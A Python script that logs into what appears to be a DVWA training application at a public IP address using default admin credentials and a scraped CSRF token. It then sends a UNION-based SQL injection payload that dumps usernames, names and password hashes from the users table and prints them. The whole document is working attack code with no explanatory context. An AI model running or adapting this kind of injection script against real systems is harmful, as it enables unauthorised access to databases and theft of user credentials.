
import requests
import re
from urllib.parse import quote

session = requests.Session()

# Get fresh token and login
resp = session.get("http://31.97.117.123/login.php")
match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
token = match.group(1) if match else "574fcd28f93f57c93cb554ecaf3ca520"

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

resp = session.post("http://31.97.117.123/login.php", data=login_data)

# Now let's extract all the data we need
# First, let's get first_name concatenated with other data
payload = "999' UNION SELECT user_id, CONCAT(user, '|', first_name, '|', last_name, '|', password) FROM users-- -"
resp = session.get(f"http://31.97.117.123/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")

# Extract the data from response
pattern = r'First name: (\d+)<br />Surname: ([^<]+)<'
matches = re.findall(pattern, resp.text)

print("EXTRACTED USER DATA FROM USERS TABLE:")
print("=" * 100)
print(f"{'User ID':<10} {'Username':<15} {'First Name':<15} {'Last Name':<15} {'Password Hash':<35}")
print("=" * 100)

for user_id, data in matches:
    parts = data.split('|')
    if len(parts) == 4:
        username, first_name, last_name, password_hash = parts
        print(f"{user_id:<10} {username:<15} {first_name:<15} {last_name:<15} {password_hash:<35}")

print("\n\nFull Response snippet:")
print(resp.text[2200:3500])

